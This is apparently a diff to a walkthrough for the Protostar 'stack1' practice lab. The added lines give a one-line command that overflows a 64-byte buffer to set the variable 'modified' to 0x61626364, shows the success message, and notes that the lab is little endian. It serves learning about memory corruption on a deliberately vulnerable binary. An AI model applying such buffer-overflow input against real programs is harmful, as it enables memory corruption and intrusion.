@@ -1,6 +1,6 @@
-From the available source code you can see variable 'modified' must equal 0x61626364.
+From the available source code you can see variable 'modified' must equal 0x61626364 and because we know the right offset from the previous level, it's a quite easy:
 
-1. Find the right offset
-> Since we know the right offset from the previous level, let's see how we can easily and fast get it.
+$ ./stack1 $(python -c 'print "A" * 64 + "\x64\x63\x62\x61"')                                        
+you have correctly got the variable to the right value
 
-2. 
+[!] Don't forget, Protostar lab is little endian.
